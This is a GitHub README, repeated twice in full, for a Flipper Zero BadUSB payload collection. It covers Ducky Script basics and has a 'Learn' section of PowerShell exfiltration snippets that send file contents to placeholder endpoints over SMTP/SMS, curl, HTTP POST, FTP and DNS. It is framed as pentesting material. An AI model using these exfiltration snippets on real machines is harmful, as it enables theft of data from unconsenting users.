<div align="center">

  <img src="assets/logo.png" alt="logo" width="200" height="auto" />
  <h1>Flipper Zero BADUSB Repo</h1>
  
  <p>
    A Collection of Flipper Zero BADUSB Payloads
  </p>
   
<h4>
    <a href="https://github.com/Louis3797/awesome-readme-template/">Quick Start</a>
  <span> · </span>
    <a href="https://github.com/Louis3797/awesome-readme-template">Learn</a>
  <span> · </span>
    <a href="https://github.com/Louis3797/awesome-readme-template/issues/">Report Bug</a>
  </h4>
</div>

<br />

<!-- Table of Contents -->
# Table of Contents 📒

- [About the Project](#about-the-project-🌟)
  * [Rubber Ducky](#rubber-ducky-🥚)
  * [Shop](#shop-🛍️)
- [Getting Started](#getting-started-🧰)
  * [Variables](#variables-🗝️)
  * [Installation](#installation)
  * [Deployment](#deployment-🚩)
  * [Learn](#learn-🎓)
- [Roadmap](#roadmap-🧭)
- [Contact](#contact-🤝)
- [Acknowledgements](#acknowledgements-💎)

  

<!-- About the Project -->
## About the Project 🌟
This Repository is to assist others in their pentesting adventures in addition to helping those get their feet wet for Ducky Scripts 🐥

<!-- Rubber Ducky -->
### Rubber Ducky 🥚
A USB Rubber Ducky is a keystroke injection tool that looks like a USB flash drive. When plugged in, it executes pre-programmed scripts that mimic keyboard input, allowing for quick automation of tasks such as penetration testing and security assessments.

## Shop 🛍️
<details>
  <summary>Hak5</summary>
  <ul>
    <li><a href="https://shop.hak5.org">Hak5 Shop</a></li>
    <li><a href="https://shop.hak5.org/products/usb-rubber-ducky">Rubber Ducky</a></li>
    <li><a href="https://payloadhub.com/blogs/payloads">Hak5's Payload Hub</a></li>
    <li><a href="https://docs.hak5.org/hak5-usb-rubber-ducky">Official Ducky Script Documentation</a></li>
  </ul>
</details>

<details>
  <summary>Flipper Zero</summary>
  <ul>
    <li><a href="https://shop.flipperzero.one">Flipper Zero Shop</a></li>
    <li><a href="https://docs.flipper.net/bad-usb">Flipper Zero's Badusb Documentation</a></li>
  </ul>
</details>

<details>
<summary>Digispark</summary>
  <ul>
    <li><a href="https://www.amazon.com/digispark/s?k=digispark">Amazon Digispark</a></li>
    <li><a href="https://blog.spacehuhn.com/badusb-digispark">Digispark Badusb</a></li>
    <li><a href="https://github.com/CharlesTheGreat77/DigiPass">Digispark Badusb Payloads</a></li>
  </ul>
</details>

<details>
<summary>External Flipper Resources</summary>
  <ul>
    <li><a href="https://github.com/jamisonderek">Mr. Derek Jamison</a></li>
  </ul>
</details>

<!-- Prerequisites -->
### Prerequisites 🚬
This project (and the Flipper Zero as a whole) uses *Ducky Script version 1*. Additionally, most payloads are tested in a *Windows 10* environment. Further testing will be need on *Windows 11* environment security standards.

<!-- Getting Started -->
## Getting Started 🧰
This is a VERY brief explanation of ducky script in my own words. One may refer to this <a href="https://gist.github.com/methanoliver/efebfe8f4008e167417d4ab96e5e3cac">link</a> if in doubt of supported commands.
<details>
    <summary>REM</summary>
  <ul>
    <li>REM is used as a comment, and does not perform ANY keystroke injection. It got the name REM from the word REMark (remark).</li>
  </ul>
  <pre><code>REM This is a comment</code></pre>
</details>

<details>
    <summary>STRING</summary>
  <ul>
    <li>STRING injects injects a series of keystrokes. Interpreting lowercase, uppercase, etc. automatically with Flipper Zero's implmentation.</li>
  </ul>
  <pre><code>STRING I Love You!
ENTER</code></pre>
  Output:
  <pre><code>I Love You!</code></pre>
  <ul>
    <li>we'll cover the ENTER command right after..</li>
  </ul>
</details>

<details>
    <summary>ENTER</summary>
  <ul>
    <li>ENTER does just that.. presses the return (enter) button! This is one of many supported commands which can be found <a href="https://gist.github.com/methanoliver/efebfe8f4008e167417d4ab96e5e3cac">here</a>!</li>
  </ul>
  <pre><code>STRING I Love You!
ENTER</code></pre>
  Output:
  <pre><code>I Love You!</code></pre>
</details>

<details>
    <summary>DELAY</summary>
  <ul>
    <li>DELAY creates a momentary pause in miliseconds. This is VERY useful when keystrokes are too fast for the target computer to interpret. If your working payload is failing.. this is probably the cause (ADD MORE DELAY).</li>
  </ul>
  <pre><code>STRING hey!
ENTER
DELAY 1000
STRING how are you?
ENTER
</code></pre>
  Output:
  <pre><code>hey!
[delays for 1 second]
how are you?</code></pre>
</details>

<details>
    <summary>Additional Commands</summary>
  <ul>
    <li>Modifiers: <pre><code>CTRL
CONTROL
SHIFT
ALT
GUI
WINDOWS</code></pre></li>
    <li>Combos: <pre><code>CTRL-ALT
CTRL-SHIFT
ALT-SHIFT
ALT-GUI
GUI-SHIFT</code></pre></li>
    <li>Cursors: <pre><code>DOWNARROW
DOWN
LEFTARROW
LEFT
RIGHTARROW
RIGHT
UPARROW
UP</code></pre></li>
    <li>Control and navigation: <pre><code>ENTER, BREAK, PAUSE, CAPSLOCK, DELETE, BACKSPACE, END, ESC, ESCAPE, HOME, INSERT, NUMLOCK, PAGEUP, PAGEDOWN, PRINTSCREEN, SCROLLOCK, SPACE, TAB, MENU, APP, SYSRQ</code></pre></li>
    <li>Functions: <pre><code>F1, F2, F3, F4, F5, F6, F7, F8, F9, F10, F11, F12</code></pre></li>
  </ul>
</details>

<details>
    <summary>Your first payload (Windows)</summary>
  <ul>
    <li>Lets create a simple payload to open notepad and display.</li>
  </ul>
  <pre><code>GUI r
STRING notepad.exe
ENTER
DELAY 2000
STRING hello world!
ENTER
</code></pre>
  Output: Opens the windows run box with GUI r [GUI is a modifier], and types in notepad.exe, which opens notetpad and types:
  <pre><code>hello world!</code></pre>
  <ul>
    <li>Again, you can find modifiers, combos, cursors, etc. <a href="https://gist.github.com/methanoliver/efebfe8f4008e167417d4ab96e5e3cac">here</a></li>
  </ul>
</details>



<!-- Variables -->
### Variables 🗝️
To run most scripts (outside of PlugNPlay folder), one must populate the variables inside the payload (.txt) file. All variables will be clearly stated with ```%CHANGE_ME%```

Examples:
```
discord_webook = %CHANGE_ME%
```
```
smtp_server = %CHANGE_ME%
```

<!-- Download -->
# Installation
<details>
    <summary>Install BADUSB Repository 🖥️</summary>
    <details>
        <summary>Windows Install 🪟</summary>
            <ul>
                <li>Download the zip and extract the contents in your preffered directory.</li>
            </ul>
            <ul>
                <img src="assets/download.png" alt="logo" width="auto" height="auto" />
            </ul>
    </details>
    <details>
        <summary>Linux Download 🖥️</summary>
        <ul>
            <li>In any terminal:</li>
            <pre><code>git clone https://github.com/CharlesTheGreat77/BADUSB</code></pre>
        </ul>
    </details>

</details>


<!-- Deployment -->
## Deployment 🚩

To deploy the payloads, one must edit the payload (if required) by changing the variables accordingly in the *.txt* file(s) of choice. 

Copy the payloads in the badusb folder in the flipper zero BADUSB directory.


<!-- Payload Development -->
## Learn 🎓
These are brief powershell concepts which covers just about whatever you need for red teaming.
<details>
    <summary>Exfiltration Methods</summary>
  <ul>
    <li>SMTP and/or SMS</li>
  </ul>

```powershell
$hello_world = "Hello World!" # exfiltrate data
$send_to = "%SEND_TO%" # could be the email used below, another email, or a phone number
$smtp_server = "%SMTP_SERVER%" # smtp.gmail.com
$smtp_username = "%SMTP_USERNAME%" # gmail account [example@gmail.com]
$token = "%TOKEN%" # gmail token/smtp password
$SMTPInfo = New-Object Net.Mail.SmtpClient($smtp_server, 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential($smtp_username, $token); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = $smtp_username; $ReportEmail.To.Add($send_to); $ReportEmail.Body = "Flipper Report: $hello_world"; $SMTPInfo.Send($ReportEmail)
```
Phone Number Setup for *send_to* variable:
    
    Format: <phonenumber>@smsgateway
    example: 9992221111@tmomail.net
SMS Gateways for Service Providers can be found <a href="https://gist.github.com/methanoliver/efebfe8f4008e167417d4ab96e5e3cac">here</a>!

  <ul>
    <li>File Transfer with curl:</li>
  </ul>

```powershell
curl.exe -F "file1=@filename.txt" <end_point>
```
  <ul>
    <li>HTTP POST request:</li>
  </ul>

```powershell
$content = Get-Content %FILE_TO_EXFIL% # output.txt
Invoke-WebRequest -Uri http://<http_server> -Method POST -Body $content
```
Exfiltrat files and send the contents via a HTTP post request.

  <ul>
    <li>HTTP POST request:</li>
  </ul>

  <ul>
    <li>FTP File Upload:</li>
  </ul>

```powershell
$fileName = "%FILENAME%"
$ftpUrl = "%FTP_URL%"
$ftpPassw = "%FTP_PASSWORD%"
$sampleData = "Sample data for exfiltration test"
Set-Content -Path $fileName -Value $sampleData
$creds = Get-Credential -Credential $ftpPassw
Invoke-WebRequest -Uri $ftpUrl -Method Put -InFile $fileName -Credential $creds
```
Upload files via FTP to an existing FTP server
  <ul>
    <li>Exfiltrate over DNS:</li>
  </ul>

```powershell
$dnsServer = "%DNS_SERVER%"
$exfiltratedData = "String of exfiltrated data"
$chunkSize = 63 # look at the sizes of record types
$encodedData = [System.Text.Encoding]::UTF8.GetBytes($exfiltratedData)
$encodedData = [Convert]::ToBase64String($encodedData)
$chunks = $encodedData -split "(.{$chunkSize})"
foreach ($chunk in $chunks) {
    $dnsQuery = $chunk + "." + $dnsServer
    Resolve-DnsName -Name $dnsQuery
    Start-Sleep -Seconds 5
}
```

</details>

<!-- Roadmap -->
## Roadmap 🧭

* [ ] Update Learn section in README
* [ ] Update filesystem hierarchy
* [ ] Update Payload list

<!-- Contact -->
## Contact 🤝

Dicord: DoobTheGoober

Projects: [github](https://github.com/CharlesTheGreat77)


<!-- Acknowledgments -->
## Acknowledgements 💎
I want to give some honor to specific individuals regardless of contribution for payload creation or sheer knowledge and motivation!

 - [Rocket God](https://github.com/RocketGod-git)
 - [Kavitate](https://github.com/Kavitate)
 - [Derek Jamison](https://github.com/jamisonderek)
 - [Redd](hhttps://github.com/InfoSecREDD)
<div align="center">

  <img src="assets/logo.png" alt="logo" width="200" height="auto" />
  <h1>Flipper Zero BADUSB Repo</h1>
  
  <p>
    A Collection of Flipper Zero BADUSB Payloads
  </p>
   
<h4>
    <a href="https://github.com/Louis3797/awesome-readme-template/">Quick Start</a>
  <span> · </span>
    <a href="https://github.com/Louis3797/awesome-readme-template">Learn</a>
  <span> · </span>
    <a href="https://github.com/Louis3797/awesome-readme-template/issues/">Report Bug</a>
  </h4>
</div>

<br />

<!-- Table of Contents -->
# Table of Contents 📒

- [About the Project](#about-the-project-🌟)
  * [Rubber Ducky](#rubber-ducky-🥚)
  * [Shop](#shop-🛍️)
- [Getting Started](#getting-started-🧰)
  * [Variables](#variables-🗝️)
  * [Installation](#installation)
  * [Deployment](#deployment-🚩)
  * [Learn](#learn-🎓)
- [Roadmap](#roadmap-🧭)
- [Contact](#contact-🤝)
- [Acknowledgements](#acknowledgements-💎)

  

<!-- About the Project -->
## About the Project 🌟
This Repository is to assist others in their pentesting adventures in addition to helping those get their feet wet for Ducky Scripts 🐥

<!-- Rubber Ducky -->
### Rubber Ducky 🥚
A USB Rubber Ducky is a keystroke injection tool that looks like a USB flash drive. When plugged in, it executes pre-programmed scripts that mimic keyboard input, allowing for quick automation of tasks such as penetration testing and security assessments.

## Shop 🛍️
<details>
  <summary>Hak5</summary>
  <ul>
    <li><a href="https://shop.hak5.org">Hak5 Shop</a></li>
    <li><a href="https://shop.hak5.org/products/usb-rubber-ducky">Rubber Ducky</a></li>
    <li><a href="https://payloadhub.com/blogs/payloads">Hak5's Payload Hub</a></li>
    <li><a href="https://docs.hak5.org/hak5-usb-rubber-ducky">Official Ducky Script Documentation</a></li>
  </ul>
</details>

<details>
  <summary>Flipper Zero</summary>
  <ul>
    <li><a href="https://shop.flipperzero.one">Flipper Zero Shop</a></li>
    <li><a href="https://docs.flipper.net/bad-usb">Flipper Zero's Badusb Documentation</a></li>
  </ul>
</details>

<details>
<summary>Digispark</summary>
  <ul>
    <li><a href="https://www.amazon.com/digispark/s?k=digispark">Amazon Digispark</a></li>
    <li><a href="https://blog.spacehuhn.com/badusb-digispark">Digispark Badusb</a></li>
    <li><a href="https://github.com/CharlesTheGreat77/DigiPass">Digispark Badusb Payloads</a></li>
  </ul>
</details>

<details>
<summary>External Flipper Resources</summary>
  <ul>
    <li><a href="https://github.com/jamisonderek">Mr. Derek Jamison</a></li>
  </ul>
</details>

<!-- Prerequisites -->
### Prerequisites 🚬
This project (and the Flipper Zero as a whole) uses *Ducky Script version 1*. Additionally, most payloads are tested in a *Windows 10* environment. Further testing will be need on *Windows 11* environment security standards.

<!-- Getting Started -->
## Getting Started 🧰
This is a VERY brief explanation of ducky script in my own words. One may refer to this <a href="https://gist.github.com/methanoliver/efebfe8f4008e167417d4ab96e5e3cac">link</a> if in doubt of supported commands.
<details>
    <summary>REM</summary>
  <ul>
    <li>REM is used as a comment, and does not perform ANY keystroke injection. It got the name REM from the word REMark (remark).</li>
  </ul>
  <pre><code>REM This is a comment</code></pre>
</details>

<details>
    <summary>STRING</summary>
  <ul>
    <li>STRING injects injects a series of keystrokes. Interpreting lowercase, uppercase, etc. automatically with Flipper Zero's implmentation.</li>
  </ul>
  <pre><code>STRING I Love You!
ENTER</code></pre>
  Output:
  <pre><code>I Love You!</code></pre>
  <ul>
    <li>we'll cover the ENTER command right after..</li>
  </ul>
</details>

<details>
    <summary>ENTER</summary>
  <ul>
    <li>ENTER does just that.. presses the return (enter) button! This is one of many supported commands which can be found <a href="https://gist.github.com/methanoliver/efebfe8f4008e167417d4ab96e5e3cac">here</a>!</li>
  </ul>
  <pre><code>STRING I Love You!
ENTER</code></pre>
  Output:
  <pre><code>I Love You!</code></pre>
</details>

<details>
    <summary>DELAY</summary>
  <ul>
    <li>DELAY creates a momentary pause in miliseconds. This is VERY useful when keystrokes are too fast for the target computer to interpret. If your working payload is failing.. this is probably the cause (ADD MORE DELAY).</li>
  </ul>
  <pre><code>STRING hey!
ENTER
DELAY 1000
STRING how are you?
ENTER
</code></pre>
  Output:
  <pre><code>hey!
[delays for 1 second]
how are you?</code></pre>
</details>

<details>
    <summary>Additional Commands</summary>
  <ul>
    <li>Modifiers: <pre><code>CTRL
CONTROL
SHIFT
ALT
GUI
WINDOWS</code></pre></li>
    <li>Combos: <pre><code>CTRL-ALT
CTRL-SHIFT
ALT-SHIFT
ALT-GUI
GUI-SHIFT</code></pre></li>
    <li>Cursors: <pre><code>DOWNARROW
DOWN
LEFTARROW
LEFT
RIGHTARROW
RIGHT
UPARROW
UP</code></pre></li>
    <li>Control and navigation: <pre><code>ENTER, BREAK, PAUSE, CAPSLOCK, DELETE, BACKSPACE, END, ESC, ESCAPE, HOME, INSERT, NUMLOCK, PAGEUP, PAGEDOWN, PRINTSCREEN, SCROLLOCK, SPACE, TAB, MENU, APP, SYSRQ</code></pre></li>
    <li>Functions: <pre><code>F1, F2, F3, F4, F5, F6, F7, F8, F9, F10, F11, F12</code></pre></li>
  </ul>
</details>

<details>
    <summary>Your first payload (Windows)</summary>
  <ul>
    <li>Lets create a simple payload to open notepad and display.</li>
  </ul>
  <pre><code>GUI r
STRING notepad.exe
ENTER
DELAY 2000
STRING hello world!
ENTER
</code></pre>
  Output: Opens the windows run box with GUI r [GUI is a modifier], and types in notepad.exe, which opens notetpad and types:
  <pre><code>hello world!</code></pre>
  <ul>
    <li>Again, you can find modifiers, combos, cursors, etc. <a href="https://gist.github.com/methanoliver/efebfe8f4008e167417d4ab96e5e3cac">here</a></li>
  </ul>
</details>



<!-- Variables -->
### Variables 🗝️
To run most scripts (outside of PlugNPlay folder), one must populate the variables inside the payload (.txt) file. All variables will be clearly stated with ```%CHANGE_ME%```

Examples:
```
discord_webook = %CHANGE_ME%
```
```
smtp_server = %CHANGE_ME%
```

<!-- Download -->
# Installation
<details>
    <summary>Install BADUSB Repository 🖥️</summary>
    <details>
        <summary>Windows Install 🪟</summary>
            <ul>
                <li>Download the zip and extract the contents in your preffered directory.</li>
            </ul>
            <ul>
                <img src="assets/download.png" alt="logo" width="auto" height="auto" />
            </ul>
    </details>
    <details>
        <summary>Linux Download 🖥️</summary>
        <ul>
            <li>In any terminal:</li>
            <pre><code>git clone https://github.com/CharlesTheGreat77/BADUSB</code></pre>
        </ul>
    </details>

</details>


<!-- Deployment -->
## Deployment 🚩

To deploy the payloads, one must edit the payload (if required) by changing the variables accordingly in the *.txt* file(s) of choice. 

Copy the payloads in the badusb folder in the flipper zero BADUSB directory.


<!-- Payload Development -->
## Learn 🎓
These are brief powershell concepts which covers just about whatever you need for red teaming.
<details>
    <summary>Exfiltration Methods</summary>
  <ul>
    <li>SMTP and/or SMS</li>
  </ul>

```powershell
$hello_world = "Hello World!" # exfiltrate data
$send_to = "%SEND_TO%" # could be the email used below, another email, or a phone number
$smtp_server = "%SMTP_SERVER%" # smtp.gmail.com
$smtp_username = "%SMTP_USERNAME%" # gmail account [example@gmail.com]
$token = "%TOKEN%" # gmail token/smtp password
$SMTPInfo = New-Object Net.Mail.SmtpClient($smtp_server, 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential($smtp_username, $token); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = $smtp_username; $ReportEmail.To.Add($send_to); $ReportEmail.Body = "Flipper Report: $hello_world"; $SMTPInfo.Send($ReportEmail)
```
Phone Number Setup for *send_to* variable:
    
    Format: <phonenumber>@smsgateway
    example: 9992221111@tmomail.net
SMS Gateways for Service Providers can be found <a href="https://gist.github.com/methanoliver/efebfe8f4008e167417d4ab96e5e3cac">here</a>!

  <ul>
    <li>File Transfer with curl:</li>
  </ul>

```powershell
curl.exe -F "file1=@filename.txt" <end_point>
```
  <ul>
    <li>HTTP POST request:</li>
  </ul>

```powershell
$content = Get-Content %FILE_TO_EXFIL% # output.txt
Invoke-WebRequest -Uri http://<http_server> -Method POST -Body $content
```
Exfiltrat files and send the contents via a HTTP post request.

  <ul>
    <li>HTTP POST request:</li>
  </ul>

  <ul>
    <li>FTP File Upload:</li>
  </ul>

```powershell
$fileName = "%FILENAME%"
$ftpUrl = "%FTP_URL%"
$ftpPassw = "%FTP_PASSWORD%"
$sampleData = "Sample data for exfiltration test"
Set-Content -Path $fileName -Value $sampleData
$creds = Get-Credential -Credential $ftpPassw
Invoke-WebRequest -Uri $ftpUrl -Method Put -InFile $fileName -Credential $creds
```
Upload files via FTP to an existing FTP server
  <ul>
    <li>Exfiltrate over DNS:</li>
  </ul>

```powershell
$dnsServer = "%DNS_SERVER%"
$exfiltratedData = "String of exfiltrated data"
$chunkSize = 63 # look at the sizes of record types
$encodedData = [System.Text.Encoding]::UTF8.GetBytes($exfiltratedData)
$encodedData = [Convert]::ToBase64String($encodedData)
$chunks = $encodedData -split "(.{$chunkSize})"
foreach ($chunk in $chunks) {
    $dnsQuery = $chunk + "." + $dnsServer
    Resolve-DnsName -Name $dnsQuery
    Start-Sleep -Seconds 5
}
```

</details>

<!-- Roadmap -->
## Roadmap 🧭

* [ ] Update Learn section in README
* [ ] Update filesystem hierarchy
* [ ] Update Payload list

<!-- Contact -->
## Contact 🤝

Dicord: DoobTheGoober

Projects: [github](https://github.com/CharlesTheGreat77)


<!-- Acknowledgments -->
## Acknowledgements 💎
I want to give some honor to specific individuals regardless of contribution for payload creation or sheer knowledge and motivation!

 - [Rocket God](https://github.com/RocketGod-git)
 - [Kavitate](https://github.com/Kavitate)
 - [Derek Jamison](https://github.com/jamisonderek)
 - [Redd](hhttps://github.com/InfoSecREDD)
